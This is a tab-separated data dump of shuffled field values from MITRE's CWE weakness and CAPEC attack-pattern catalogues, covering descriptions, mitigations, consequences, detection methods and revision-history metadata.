13088	39	2012-10-30
9501	100	The MITRE Corporation
13261	69	Incomplete
23979	28	CWE Content Team
24664	28	CWE Content Team
5800	61	Draft
11371	86	http://tools.ietf.org/html/rfc2898
23843	62	updated Time_of_Introduction
16016	56	ChildOf
8235	52	According to SOAR, the following detection techniques may be useful:                                         Highly cost effective:                                                                           Formal Methods / Correct-By-Construction                                                                     Cost effective for partial coverage:                                                                           Inspection (IEEE 1028 standard) (can apply to requirements, design, source code, etc.)
12714	62	updated Modes_of_Introduction, References, Relationships, Relevant_Properties
23253	103	Primary
16160	62	updated Relationships
10760	23	A software system that accepts path input in the form of multiple leading slash ('//multiple/leading/slash') without appropriate validation can lead to ambiguous path resolution and allow an attacker to traverse the file system to unintended locations or access arbitrary files.
12439	69	Draft
9009	42	Ban the use of dangerous functions. Use their safe equivalent.
21583	62	updated Observed_Examples
20193	23	An attacker gains control of a process that is assigned elevated privileges in order to execute arbitrary code with those privileges. Some processes are assigned elevated privileges on an operating system, usually through association with a particular user, group, or role. If an attacker can hijack this process, they will be able to assume its level of privilege in order to execute their own code. Processes can be hijacked through improper handling of user input (for example, a buffer overflow or certain types of injection attacks) or by utilizing system utilities that support process control that have been inadequately secured.
16121	72	The attacker may find sensitive information located in the WSDL file.
17250	28	Eric Dalci
22876	62	Significant clarification of this entry, and improved examples.
21129	43	Simple
23393	61	Draft
24445	73	Guess cookie contents if it contains predictable information.
14127	49	2005
8765	25	Medium
17567	62	updated References, Relationships
15254	28	CWE Content Team
9345	28	CWE Content Team
11355	76	2017-01-09
23351	40	The adversary must be able to manipulate some piece of the shared data either directly or indirectly and the other users of the data must accept the changed data as valid. Usually this requires that the adversary be able to compromise one of the sharing applications or threads in order to manipulate the shared data.
21857	45	Base
16788	76	2019-09-30
11204	28	Eric Dalci
15283	23	An adversary uses alternate forms of keywords or commands that result in the same action as the primary form but which may not be caught by filters. For example, many keywords are processed in a case insensitive manner. If the site's web filtering algorithm does not convert all tags into a consistent case before the comparison with forbidden keywords it is possible to bypass filters (e.g., incomplete black lists) by using an alternate case structure. For example, the "script" tag using the alternate forms of "Script" or "ScRiPt" may bypass filters where "script" is the only form tested. Other variants using different syntax representations are also possible as well as using pollution meta-characters or entities that are eventually ignored by the rendering engine. The attack can result in the execution of otherwise prohibited functionality.
22813	31	1000
23015	47	Bypass Protection Mechanism
5924	35	MITRE
10556	85	424
15454	91	Testing
17169	28	CWE Content Team
24282	62	updated Demonstrative_Examples, Observed_Examples, References, Relationships
24571	35	MITRE
8991	23	The application uses a protection mechanism that relies on the existence or values of a cookie, but it does not properly ensure that the cookie is valid for the associated user.
20461	28	CWE Content Team
10511	35	MITRE
9583	49	2016
18949	89	Detailed
18649	35	MITRE
12891	28	Eric Dalci
24357	36	http://www.ws-attacks.org/index.php/Soap_Array_Attack
12261	31	1000
13063	69	Draft
16151	97	Using Unpublished APIs
14775	79	Availability
9962	35	MITRE
11419	39	2017-11-08
15164	28	CWE Content Team
13556	39	2012-10-30
14577	63	Modify Files or Directories
15412	39	2008-10-14
7693	62	updated Name
8944	93	Defense in Depth
6928	55	CAPEC Content Team
21300	100	The MITRE Corporation
13293	69	Incomplete
9000	35	MITRE
23423	100	The MITRE Corporation
24534	96	2008-01-30
11169	79	Confidentiality
10046	89	Standard
14187	91	Implementation
15947	32	The Open Web Application Security Project (OWASP)
10292	91	Architecture and Design
18142	81	Other
8208	28	CWE Content Team
7422	39	2011-06-27
9988	35	MITRE
14869	91	Architecture and Design
22743	62	updated Demonstrative_Examples
8782	78	High
17896	28	CWE Content Team
24805	24	Cigital
24821	35	MITRE
10779	94	Denial of Service
15139	23	An attacker gains access to application, service, or device with the privileges of an authorized or privileged user by evading or circumventing an authentication mechanism. The attacker is therefore able to access protected data without authentication ever having taken place. This refers to an attacker gaining access equivalent to an authenticated user without ever going through an authentication procedure. This is usually the result of the attacker using an unexpected access procedure that does not go through the proper checkpoints where authentication should occur. For example, a web site might assume that all users will click through a given link in order to get to secure material and simply authenticate everyone that clicks the link. However, an attacker might be able to reach secured web content by explicitly entering the path to the content rather than clicking through the authentication link, thereby avoiding the check entirely. This attack pattern differs from other authentication attacks in that attacks of this pattern avoid authentication entirely, rather than faking authentication by exploiting flaws or by stealing credentials from legitimate users.
24960	81	Other
21592	39	2008-11-24
12998	94	Information Leakage
9422	80	Attacker identifies known local files to exploit
11649	103	Primary
21966	62	updated Relationships
11619	100	The MITRE Corporation
11468	35	MITRE
21652	39	2011-06-01
14578	39	2014-07-30
7385	74	1
11264	62	updated References, Relationships
13167	56	ChildOf
25044	35	MITRE
8457	90	C
17015	62	updated Alternate_Terms, Description, Name, Observed_Examples, References
13679	61	Draft
13898	53	The MITRE Corporation
16646	39	2014-07-30
14098	39	2011-06-01
13858	39	2014-07-30
9601	62	updated Relationships
23375	104	214
6428	47	Gain Privileges
21835	62	updated Common_Consequences
7081	62	updated Potential_Mitigations
22084	45	Base
22027	91	Architecture and Design
9922	100	The MITRE Corporation
12221	85	185
22931	62	Suggested OWASP Top Ten 2004 mapping
9850	73	Induce denial of service by exploiting resource leaks or bad error handling.
12289	78	High
13664	103	Primary
19677	91	Implementation
8017	56	ChildOf
10716	62	updated Demonstrative_Examples
19920	77	Automated Static Analysis - Binary or Bytecode
9554	62	updated Relationships
16390	35	MITRE
10945	63	Other
14459	39	2011-06-01
21084	28	CWE Content Team
5882	79	Access Control
19895	78	Very High
18594	35	MITRE
15470	28	CWE Content Team
18197	28	CWE Content Team
11714	28	CWE Content Team
14932	62	updated Detection_Factors, Relationships, Taxonomy_Mappings
22556	28	CWE Content Team
19551	28	CWE Content Team
10926	62	updated References, Relationships
13575	62	updated Demonstrative_Examples
12058	28	CWE Content Team
15774	27	None: No specialized resources are required to execute this type of attack. The only requirement is the ability to create the necessary symbolic link.
18850	35	MITRE
7579	35	MITRE
14983	28	CWE Content Team
14348	62	updated Common_Consequences
17095	63	Modify Memory
24010	62	updated Demonstrative_Examples, Relationships
18086	101	CAPEC Content Team
12475	39	2011-03-29
22169	74	1
6884	43	Simple
5681	78	High
18218	46	When software is operating in a concurrent environment and repeatedly locks a critical resource, the consequences will vary based on the type of lock, the lock's implementation, and the resource being protected. In some situations such as with semaphores, the resources are pooled and extra locking calls will reduce the size of the total available pool, possibly leading to degraded performance or a denial of service. If this can be triggered by an attacker, it will be similar to an unrestricted lock (CWE-412). In the context of a binary lock, it is likely that any duplicate locking attempts will never succeed since the lock is already held and progress may not be possible.
22838	35	MITRE
12568	31	1000
13185	47	Execute Unauthorized Commands
7014	35	MITRE
24671	35	MITRE
22607	56	ChildOf
9300	62	updated Applicable_Platforms, Modes_of_Introduction, Relationships
7004	62	updated Relationships, Taxonomy_Mappings
17528	23	The source code contains whitespace that is inconsistent across      the code or does not follow expected standards for the      product.
19703	81	Integrity
10186	23	The software contains a clone() method that does not call super.clone() to obtain the new object.
19331	49	2018
15152	34	REALIZATION: This weakness is caused during implementation of an architectural security tactic.
16871	59	Updated References
22469	90	Language-Independent
11679	81	Other
22096	28	CWE Content Team
23266	59	Updated Attack_Phases, Description Summary, Resources_Required
19320	104	182
18432	27	Because some application may have a large number of temporary files and/or these temporary files may be very large, an adversary may need tools that help them quickly search these files for sensitive information. If the adversary can simply copy the files to another location and if the speed of the search is not important, the adversary can still perform the attack without any special resources.
5928	92	Explore
6838	91	Build and Compilation
10294	39	2008-09-08
13875	40	The target application must have an integer variable for which only some of the possible integer values are expected by the application and where there are no checks on the value of the variable before use.
25353	35	MITRE
22911	62	updated Description, Potential_Mitigations
23898	35	MITRE
13635	71	2004
17569	39	2009-07-27
19167	25	Low
23552	34	OMISSION: This weakness is caused by missing a security tactic during the architecture and design phase.
19962	28	Eric Dalci
22548	89	Detailed
23521	62	updated Applicable_Platforms, Likelihood_of_Exploit
25159	31	1000
8921	62	updated Relationships
23889	39	2011-03-29
25369	90	Language-Independent
7325	80	Requires the ability to write scripts of varying complexity and to inject them through user controlled fields within the application.
6959	28	CWE Content Team
6505	96	2012-12-21
13835	91	Testing
13417	28	CWE Content Team
5795	28	Eric Dalci
14454	45	Variant
12421	28	CWE Content Team
10976	80	The adversary requires strong inter-personal and communication skills.
15542	103	Primary
12503	103	Primary
14555	59	Updated Description Summary
14574	39	2009-07-27
25003	100	The MITRE Corporation
11200	31	699
11809	81	Integrity
14030	72	Buffer overflows often can be used to execute arbitrary code, which is usually outside the scope of a program's implicit security policy.
6704	59	Updated Description Summary, Examples-Instances, Typical_Likelihood_of_Exploit
20398	39	2019-09-19
16925	56	ChildOf
19235	103	Primary
23133	28	CWE Content Team
10567	28	Sean Eidemiller
12590	35	MITRE
12622	56	ChildOf
7223	90	Language-Independent
11579	27	The attacker must have access to an application interface or a direct shell that allows them to inject directory strings and monitor the results.
14503	63	Unexpected State
25133	31	1000
21409	95	[Inject SSI] The attacker may then need to view a particular page in order to have the server execute the include directive and run a command or open a file on behalf of the attacker
12476	62	updated Observed_Examples, Relationships, Taxonomy_Mappings
19052	28	CWE Content Team
6506	35	MITRE
6530	62	updated Potential_Mitigations
9948	39	2012-10-30
21089	35	MITRE
10246	62	updated Common_Consequences
22581	28	CWE Content Team
17486	39	2017-11-08
7922	28	CWE Content Team
12437	44	High
19913	21	PLOVER
14058	35	MITRE
11085	62	updated Potential_Mitigations, Time_of_Introduction
19784	78	Low
10378	40	The targeted PHP application must have a bug that allows an attacker to control which code file is loaded at some juncture.
20546	35	Cigital
16257	88	Path Equivalence: 'file.name' (Internal Dot)
15585	28	CWE Content Team
9297	90	C
20293	35	MITRE
18551	62	updated Taxonomy_Mappings
11005	70	Firebug
10512	62	updated Maintenance_Notes
7260	28	CWE Content Team
11465	28	CWE Content Team
9812	31	1000
22016	76	2018-07-31
17352	62	added/updated demonstrative examples
16604	63	DoS: Crash, Exit, or Restart
21950	25	Low
7693	28	CWE Content Team
21190	28	CWE Content Team
7034	23	A particular privilege, role, capability, or right can be used to perform unsafe actions that were not intended, even when it is assigned to the correct entity.
7620	62	updated Demonstrative_Examples, Relationships, Taxonomy_Mappings
10116	39	2008-07-01
19592	39	2017-11-08
10621	76	2019-09-30
22040	78	Medium
14051	28	CWE Content Team
11935	35	Cigital
24636	39	2009-12-28
12702	62	updated Relationships, Taxonomy_Mappings
22649	28	CWE Content Team
10858	88	Improper Neutralization of Escape, Meta, or Control Sequences
22414	31	1000
17646	44	SOAR Partial
20978	95	Perform an exhaustive brute force search of the key space, producing candidate plaintexts and observing if they make sense.
15540	88	Information Exposure Through Servlet Runtime Error Message
6719	63	Bypass Protection Mechanism
23081	31	1003
16996	25	Low
7393	46	In some languages such as C and C++, stack variables are not initialized by default. They generally contain junk data with the contents of stack memory before the function was invoked. An attacker can sometimes control or read these contents. In other languages or conditions, a variable that is not explicitly initialized can be given a default value that has security implications, depending on the logic of the program. The presence of an uninitialized variable can sometimes indicate a typographic error in the code.
5622	103	Primary
8407	43	Simple
25352	62	updated Time_of_Introduction
12478	91	Implementation
12498	28	CWE Content Team
7844	62	updated Potential_Mitigations, Time_of_Introduction
9588	76	2017-08-04
17634	28	CWE Content Team
19046	62	updated Potential_Mitigations
23179	28	CWE Content Team
24804	88	Improper Handling of Windows Device Names
21540	50	Use browser technologies that do not allow client-side scripting.
17291	56	ChildOf
24515	35	MITRE
15423	62	updated References, Relationships
12985	39	2011-06-01
19021	67	Low
5703	61	Draft
9830	46	Although less frequent an issue than signed-to-unsigned conversion, unsigned-to-signed conversion can be the perfect precursor to dangerous buffer underwrite conditions that allow attackers to move down the stack where they otherwise might not have access in a normal buffer overflow condition. Buffer underwrites occur frequently when large unsigned values are cast to signed values, and then used as indexes into a buffer or for pointer arithmetic.
20740	35	MITRE
14603	45	Variant
8688	28	CWE Content Team
15179	101	CAPEC Content Team
18813	72	The attacker may be able to overwrite, delete, or corrupt unexpected critical files such as programs, libraries, or important data. This may prevent the software from working at all and in the case of a protection mechanisms such as authentication, it has the potential to lockout every user of the software.
21569	40	The system uses one factor password based authentication.The adversary has the means to interact with the system.
7687	35	MITRE
7277	67	Low
6809	40	An application that leverages sessions to perform authentication.
22009	57	Primary
11018	45	Base
19245	73	Manually inspect the application to find entry points.
18858	81	Integrity
9346	50	Avoid revealing information about your system (e.g., version of the program) to anonymous users.
18482	62	updated Related_Attack_Patterns
6845	45	Base
22494	63	Hide Activities
23138	28	CWE Content Team
16431	69	Draft
10099	35	MITRE
21263	39	2017-11-08
17457	45	Base
23969	91	Implementation
14470	33	Wikipedia
14560	47	Modify Data
24197	45	Variant
10551	104	405
15739	42	A language which throws exceptions on ambiguous data casts might be chosen.
11594	50	Design: Use a message authentication code (MAC) or another mechanism to perform verification of message authenticity / integrity prior to decryption                Implementation: Do not leak information back to the user as to any cryptography (e.g., padding) encountered during decryption.
18986	59	Updated Attacker_Skills_or_Knowledge_Required, Examples-Instances, References
7474	62	updated Description, Other_Notes
18709	33	M. Bishop
14024	62	updated Common_Consequences
20508	39	2012-05-11
16021	89	Detailed
8369	28	CWE Content Team
14676	35	MITRE
8984	100	The MITRE Corporation
15888	62	updated Related_Attack_Patterns
15577	24	MITRE
22473	63	Hide Activities
6470	63	Bypass Protection Mechanism
12078	39	2015-12-07
9940	27	All the attacker needs is the exact representation of requests to be made to the application and to be able to get the malicious link across to a victim.
11668	28	CWE Content Team
16517	28	CWE Content Team
7606	28	CWE Content Team
23199	39	2008-10-14
21033	33	Dilma Da Silva
21272	35	MITRE
8845	51	2014-06-23
18601	62	updated Description
15011	28	CWE Content Team
24491	28	CWE Content Team
17401	40	The server version or patch level must not inherently prevent known directory listing attacks from working.
21574	35	Cigital
11947	62	updated Demonstrative_Examples, Potential_Mitigations
8684	50	Passively monitor cellular network connection for real-time threat detection and logging for manual review.
19079	76	2017-05-01
6596	102	ChildOf
9720	39	2017-01-19
24155	21	CWE Content Team
15917	23	When the J2EE container attempts to write unserializable objects to disk there is no guarantee that the process will complete successfully.
12714	35	MITRE
15841	92	Experiment
10414	39	2014-07-30
15917	104	594
12080	35	Cigital
24491	35	MITRE
7759	31	699
6652	45	Base
8307	97	Inducing Account Lockout
18535	28	CWE Content Team
21315	28	CWE Content Team
24385	47	Resource Consumption
8657	35	MITRE
12192	66	ASP.NET Misconfiguration: Missing Custom Error Handling
16786	21	Anonymous Tool Vendor (under NDA)
22439	28	CWE Content Team
9188	62	updated Common_Consequences, Relationships, Other_Notes
12050	52	If utilizing user accounts, attempt to submit a username that contains homoglyphs. Similarly, check to see if links containing homoglyphs can be sent via email, web browsers, or other mechanisms.
22472	88	Authorization Bypass Through User-Controlled Key
18783	28	Sean Eidemiller
19292	39	2017-11-08
22041	35	MITRE
15324	60	14
16496	56	ChildOf
16109	62	updated Applicable_Platforms
17628	26	Implementation
13429	35	MITRE
20736	52	Identify error conditions that are not likely to occur during normal usage and trigger them. For example, run the program under low memory conditions, run with insufficient privileges or permissions, interrupt a transaction before it is completed, or disable connectivity to basic network services such as DNS. Monitor the software for any unexpected behavior. If you trigger an unhandled exception or similar error that was discovered and handled by the application's environment, it may still indicate unexpected conditions that were not handled by the application itself.
11702	32	Fortify Software
10703	28	CWE Content Team
13737	28	CWE Content Team
8360	76	2019-09-30
23592	51	2014-06-23
17400	76	2017-08-04
19778	96	2009-07-15
24047	34	COMMISSION: This weakness refers to an incorrect design related to an architectural security tactic.
12531	76	2015-11-09
14316	81	Availability
8995	40	Access to the manufacturer's documentation.
14921	100	The MITRE Corporation
20928	28	CWE Content Team
19299	23	An attacker exploits the underlying complexity of a data structure that allows for both signed and unsigned content, to cause unsigned data to be processed as though it were signed data.
23698	62	updated Observed_Examples, Relationships
15438	28	CWE Content Team
20223	35	MITRE
19210	28	CWE Content Team
14385	89	Detailed
15323	56	ChildOf
9392	31	1000
6683	39	2012-10-30
18721	28	CWE Content Team
22949	35	MITRE
8740	62	updated Relationships
13621	73	Determine minimum and maximum allowed password lengths.
16948	39	2008-07-01
8701	28	CWE Content Team
22526	39	2011-06-27
12077	79	Integrity
12754	39	2008-07-01
15216	35	MITRE
13178	35	MITRE
7385	95	The attacker has access to a resource path and required to use slashes as resource delimiter.
18458	102	ChildOf
8453	62	updated Relationships, Taxonomy_Mappings
16746	72	There is the potential for arbitrary code execution with privileges of the vulnerable program if function parameter list is exhausted.
16003	86	http://blogs.technet.com/swi/archive/2008/05/29/sql-injection-attack.aspx
19448	95	[Information Disclosure] The attacker crafts and injects an XQuery payload which is acted on by an XQL query leading to inappropriate disclosure of information.
18471	28	CWE Content Team
8082	91	Implementation
14100	28	CWE Content Team
20288	28	CWE Content Team
16466	55	CAPEC Content Team
24178	35	MITRE
21996	30	Bernardo Damele Assump ção Guimarães
19953	28	CWE Content Team
7649	35	MITRE
13532	80	Advanced knowledge of the design of the system and it's operating system components and subcomponents.
14054	26	Implementation
7557	88	Signal Handler with Functionality that is not Asynchronous-Safe
21835	28	CWE Content Team
18607	56	ChildOf
19977	90	Language-Independent
16646	28	CWE Content Team
10977	35	MITRE
13334	94	Run Arbitrary Code
8116	70	Orion Application Server JSP Source Disclosure Vulnerability (Bugtraq ID: 17204)
13605	62	updated Related_Attack_Patterns
7570	51	2014-06-23
10348	39	2019-01-03
11575	56	ChildOf
6853	23	A function returns the address of a stack variable, which will cause unintended program behavior, typically in the form of a crash.
13083	76	2017-05-01
8329	69	Incomplete
16929	26	Implementation
18674	43	Simple
20130	35	MITRE
12614	56	CanAlsoBe
8535	52	Manual analysis can be useful for finding this weakness, but it might not achieve desired code coverage within limited time constraints. This becomes difficult for weaknesses that must be considered for all inputs, since the attack surface can be too large.
7485	63	Varies by Context
17725	35	Cigital
18877	42	Avoid using signed variables if you don't need to represent negative values. When negative values are needed, perform sanity checks after you save those values to larger data types, or before passing them to functions that are expecting unsigned values.
24790	49	1998
8108	91	Architecture and Design
17569	62	updated Potential_Mitigations
25385	62	updated Relationships
24976	101	CAPEC Content Team
10147	28	CWE Content Team
6878	74	1
16618	62	updated Common_Consequences
20527	62	updated Applicable_Platforms, Demonstrative_Examples
17800	103	Primary
21755	31	699
12105	76	2018-07-31
7530	39	2011-03-29
22829	81	Other
10495	91	Build and Compilation
19416	62	updated References, Relationships, Taxonomy_Mappings
18113	51	2014-06-23
23876	81	Availability
16470	59	Updated Related_Weaknesses
17955	29	1st Edition
20199	28	CWE Content Team
20867	63	Unexpected State
23970	43	Simple
17258	78	Low
11413	47	Bypass Protection Mechanism
20561	59	Updated Related_Attack_Patterns, Taxonomy_Mappings
6322	88	Access to Critical Private Variable via Public Method
14175	78	High
6839	62	updated Modes_of_Introduction, References, Relationships
11739	62	updated Description, Potential_Mitigations, Relationships
19736	62	updated Description
24246	100	The MITRE Corporation
14146	57	Indirect
9442	31	1003
22350	91	Implementation
16712	39	2012-05-11
9872	28	CWE Content Team
16130	77	Manual Static Analysis - Binary or Bytecode
5857	56	ChildOf
8874	35	MITRE
22883	90	C++
19539	62	updated Potential_Mitigations
5777	28	CWE Content Team
18804	52	According to SOAR, the following detection techniques may be useful:                                         Highly cost effective:                                                                           Manual Source Code Review (not inspections)                                                                     Cost effective for partial coverage:                                                                           Focused Manual Spotcheck - Focused manual analysis of source
9783	47	Execute Unauthorized Commands
10200	35	MITRE
20049	45	Base
8708	63	Modify Files or Directories
17732	90	Language-Independent
15636	77	Automated Static Analysis - Source Code
24474	39	2014-06-23
9892	35	MITRE
24038	56	ChildOf
13075	35	MITRE
8241	35	MITRE
9369	35	MITRE
6402	72	It is critically important that validation logic be maintained and kept in sync with the rest of the application. Unchecked input is the root cause of some of today's worst and most common software security problems. Cross-site scripting, SQL injection, and process control vulnerabilities all stem from incomplete or absent input validation.
17996	62	updated Potential_Mitigations, Time_of_Introduction
17754	85	274
16078	39	2011-06-27
20868	62	updated Potential_Mitigations
9066	72	An attacker may be able to decrypt the data using brute force attacks.
8321	39	2009-05-27
19738	62	updated Relationships, Taxonomy_Mappings
6471	97	Client-side Injection-induced Buffer Overflow
22585	42	Inputs should be decoded and canonicalized to the application's current internal representation before being validated (CWE-180). Make sure that the application does not decode the same input twice (CWE-174). Such errors could be used to bypass whitelist validation schemes by introducing dangerous inputs after they have been checked.
9431	56	ChildOf
11433	57	Primary
6050	42	Run your code using the lowest privileges that are required to accomplish the necessary tasks [REF-76]. If possible, create isolated accounts with limited privileges that are only used for a single task. That way, a successful attack will not immediately give the attacker access to the rest of the software or its environment. For example, database applications rarely need to run as the database administrator, especially in day-to-day operations.
24655	28	CWE Content Team
10185	28	CWE Content Team
7177	39	2011-06-01
11285	47	Other
6588	39	2008-11-05
9280	39	2009-07-27
23260	39	2012-05-11
12851	43	Simple
16952	80	In most cases, overflowing a buffer does not require advanced skills beyond the ability to notice an overflow and stuff an input variable with content.
20914	39	2011-03-29
21799	85	443
7631	81	Availability
24643	97	Passive OS Fingerprinting
13430	35	MITRE
14888	104	431
13620	62	updated Relationships
19798	39	2009-05-27
16306	21	PLOVER
12869	90	Language-Independent
7104	51	2014-06-23
25293	40	A resource is access/modified concurrently by multiple processes.
13893	62	updated Applicable_Platforms, Demonstrative_Examples, References, Relationships, Taxonomy_Mappings
11421	62	updated Demonstrative_Examples, Related_Attack_Patterns, Relationships
19807	36	https://www.owasp.org/index.php/Format_String
8510	42	Inputs should be decoded and canonicalized to the application's current internal representation before being validated (CWE-180). Make sure that the application does not decode the same input twice (CWE-174). Such errors could be used to bypass whitelist validation schemes by introducing dangerous inputs after they have been checked.
20336	62	updated Likelihood_of_Exploit, Modes_of_Introduction, References, Relationships, Taxonomy_Mappings
24891	56	ChildOf
18133	21	CWE Content Team
19266	30	Amir Herzberg
21044	63	DoS: Crash, Exit, or Restart
11560	62	updated Name, Related_Attack_Patterns
12069	62	updated Relationships, Taxonomy_Mappings
11533	28	CWE Content Team
8497	96	2008-10-01
11765	35	MITRE
21660	62	updated Potential_Mitigations
6267	62	updated Relationships
18435	42	Remove or restrict all environment settings before invoking other programs. This includes the PATH environment variable, LD_LIBRARY_PATH, and other settings that identify the location of code libraries, and any application-specific search paths.
23465	88	Public Data Assigned to Private Array-Typed Field
7090	33	Dipak Jha, Software Engineer, IBM
7098	72	An attacker may be able to bypass the authorization mechanism to gain access to the otherwise-protected URL.
6743	40	This type of an attack requires the ability to generate a large amount of SSL traffic to send a target server.
24297	25	High
9965	25	Low
15934	100	The MITRE Corporation
5773	96	2013-02-17
6192	91	Implementation
20675	35	MITRE
23410	31	699
20799	42	Limit access to the WSDL file as much as possible. If services are provided only to a limited number of entities, it may be better to provide WSDL privately to each of these entities than to publish WSDL publicly.
22643	56	ChildOf
20379	45	Variant
7265	28	CWE Content Team
15092	39	2008-09-08
20753	36	http://web.textfiles.com/hacking/footprinting.txt
23742	81	Availability
6213	94	Derive sensitive information about encrypted data.
19620	99	SANS Software Security Institute
21023	35	MITRE
10807	35	MITRE
10846	42	Run your code using the lowest privileges that are required to accomplish the necessary tasks [REF-76]. If possible, create isolated accounts with limited privileges that are only used for a single task. That way, a successful attack will not immediately give the attacker access to the rest of the software or its environment. For example, database applications rarely need to run as the database administrator, especially in day-to-day operations.                   Specifically, follow the principle of least privilege when creating user accounts to a SQL database. The database users should only have the minimum privileges necessary to use their account. If the requirements of the system indicate that a user can read and modify their own data, then limit their privileges so they cannot read/write others' data. Use the strictest permissions possible on all database objects, such as execute-only for stored procedures.
17961	39	2012-05-11
19676	103	Primary
17043	28	Eric Dalci
13328	35	MITRE
7987	93	Defense in Depth
22062	62	updated Taxonomy_Mappings
16781	60	05
21799	23	An adversary uses their privileged position within an authorized software development organization to inject malicious logic into a codebase or product. Supply chain attacks from approved or trusted developers are extremely difficult to detect as it is generally assumed the quality control and internal security measures of these organizations conform to best practices. In some cases the malicious logic is intentional, embedded by a disgruntled employee, programmer, or individual with an otherwise hidden agenda. In other cases, the integrity of the product is compromised by accident (e.g. by lapse in the internal security of the organization that results in a product becoming contaminated). In other cases, the developer embeds a backdoor into a product to serve some purpose, such as product support, but discovery of the backdoor results in its malicious use by adversaries.
12499	28	CWE Content Team
9900	62	updated Modes_of_Introduction, Relationships
24542	39	2009-05-27
10283	97	Search Order Hijacking
21902	35	MITRE
18091	62	updated Time_of_Introduction
14355	28	CWE Content Team
9649	56	CanPrecede
21671	28	CWE Content Team
13563	23	The product does not properly check inputs that are used for loop conditions, potentially leading to a denial of service because of excessive looping.
9793	103	Primary
11311	35	MITRE
12862	39	2019-06-20
23392	62	updated Description, Other_Notes
12610	53	The MITRE Corporation
9060	28	CWE Content Team
24690	35	MITRE
12306	80	The malicious user can easily try some well-known global variables and find one which matches.
8802	88	Integer Overflow or Wraparound
12439	88	Function Call With Incorrect Order of Arguments
23007	39	2012-10-30
7258	36	http://en.wikipedia.org/wiki/Debugger
14574	28	CWE Content Team
7145	35	MITRE
17204	85	224
7034	69	Incomplete
7412	68	This is not a complete solution, since buffer overflows could be used to overwrite nearby variables to modify the software's state in dangerous ways. In addition, it cannot be used in cases in which self-modifying code is required. Finally, an attack could still cause a denial of service, since the typical response is to exit the application.
24798	23	The software does not restrict a reference to a Document Type Definition (DTD) to the intended control sphere. This might allow attackers to reference arbitrary DTDs, possibly causing the software to expose files, consume excessive system resources, or execute arbitrary http requests on behalf of the attacker.
6021	28	Eric Dalci
17570	28	CWE Content Team
8443	73	List the files in the directory by issuing a request with the URL ending in a "/" slash.
22637	52	According to SOAR, the following detection techniques may be useful:                                         Cost effective for partial coverage:                                                                           Source code Weakness Analyzer                            Context-configured Source Code Weakness Analyzer
13126	94	Denial of Service
14673	39	2011-06-01
19785	79	Confidentiality
14994	35	MITRE
16672	35	MITRE
11291	103	Primary
9456	62	updated Common_Consequences
7712	28	CWE Content Team
14597	35	MITRE
13755	96	2010-08-06
5960	76	2017-01-09
5610	30	Jigang Liu
15995	51	2014-06-23
15198	46	When an IOCTL uses the METHOD_NEITHER option for I/O control, it is the responsibility of the IOCTL to validate the addresses that have been supplied to it. If validation is missing or incorrect, attackers can supply arbitrary memory addresses, leading to code execution or a denial of service.
11094	28	CWE Content Team
10678	28	CWE Content Team
6419	40	The JSON object returned from the server can be accessed by the attackers' malicious code via a script tag
17183	85	468
24440	69	Incomplete
11155	28	CWE Content Team
16057	27	Computing resource requirements will vary based on the complexity of a given cryptanalysis technique. Access to the encryption/decryption routines of the algorithm is also required.
18324	35	MITRE
14566	104	239
7489	28	CWE Content Team
12533	28	CWE Content Team
18991	28	CWE Content Team
23078	88	Insufficient Entropy
19078	23	The software performs an authorization check when an actor attempts to access a resource or perform an action, but it does not correctly perform the check. This allows attackers to bypass intended access restrictions.
24023	92	Explore
23412	39	2017-05-03
10469	56	ChildOf
18544	35	MITRE
9341	101	CAPEC Content Team
24137	103	Primary
14155	104	409
7207	28	CWE Content Team
17255	62	updated Applicable_Platforms, Relationships, Other_Notes, Taxonomy_Mappings
23239	97	Footprinting
21687	42	In Java, explicitly define final writeObject() to prevent serialization. This is the recommended solution. Define the writeObject() function to throw an exception explicitly denying serialization.
11229	63	Varies by Context
13318	76	2018-07-31
10159	28	CWE Content Team
6380	56	ChildOf
24440	88	Inclusion of Sensitive Information in Log Files
9750	39	2012-05-11
17789	56	ChildOf
16635	39	2008-09-08
6808	63	Modify Files or Directories
6026	42	Perform thorough input validation (i.e.: server side validation) on the cookie data if you're going to use it for a security related decision.
24194	103	Primary
6852	39	2012-10-30
12110	101	CAPEC Content Team
23652	63	DoS: Instability
22444	28	CWE Content Team
13786	35	MITRE
24323	35	Cigital
7029	35	Veracode
11012	28	CWE Content Team
23317	28	CWE Content Team
16822	89	Standard
16698	90	C
19572	39	2012-05-11
12146	28	CWE Content Team
20137	79	Availability
6883	62	updated Relationships
24567	76	2017-08-04
15857	35	MITRE
22101	100	The MITRE Corporation
24894	28	Eric Dalci
21689	79	Availability
19148	42	Use Static analysis tools to check for unreleased resources.
19748	39	2008-10-14
8240	76	2018-07-31
25107	28	CWE Content Team
11645	40	XPath queries used to retrieve information stored in XML documents
25104	35	MITRE
17258	40	Software tools used to probe systems over a range of ports and protocols.
21351	101	CAPEC Content Team
15097	28	CWE Content Team
20468	42	If the application only requires communication with its own components, then the destination is always known, and an explicit intent could be used.
17665	28	CWE Content Team
7812	35	MITRE
11562	39	2014-07-30
15612	62	updated Time_of_Introduction
18555	91	Architecture and Design
7876	73	Develop malicious JavaScript that is injected through vectors identified during the Experiment Phase and loaded by the victim's browser and sends document information to the attacker.
12134	35	Cigital
22159	39	2012-10-30
20467	35	MITRE
22037	62	updated Maintenance_Notes, Relationships
16983	62	updated Relationships
24356	21	CWE Content Team
17013	91	Implementation
14604	63	Reduce Performance
18001	97	UDP Ping
6813	104	1177
21346	28	Eric Dalci
16327	46	When an application relies on obfuscation or incorrectly applied / weak encryption to protect client-controllable tokens or parameters, that may have an effect on the user state, system state, or some decision made on the server. Without protecting the tokens/parameters for integrity, the application is vulnerable to an attack where an adversary blindly traverses the space of possible values of the said token/parameter in order to attempt to gain an advantage. The goal of the attacker is to find another admissible value that will somehow elevate their privileges in the system, disclose information or change the behavior of the system in some way beneficial to the attacker. If the application does not protect these critical tokens/parameters for integrity, it will not be able to determine that these values have been tampered with. Measures that are used to protect data for confidentiality should not be relied upon to provide the integrity service.
20997	43	Simple
10115	62	updated Related_Attack_Patterns
8102	92	Experiment
21460	85	532
9006	43	Simple
10440	90	Language-Independent
20365	39	2012-05-11
21931	39	2008-08-01
5986	76	2017-08-04
6706	91	Implementation
18756	43	Simple
18258	39	2013-07-17
11252	28	CWE Content Team
6028	56	ChildOf
12876	59	Updated Attack_Phases, Description, Description Summary, References
21332	79	Confidentiality
24712	62	updated Modes_of_Introduction, Relationships
6869	93	Moderate
21155	35	MITRE
14548	25	Low
19468	62	updated Applicable_Platforms, Common_Consequences, Relationships, Other_Notes, Taxonomy_Mappings, Weakness_Ordinalities
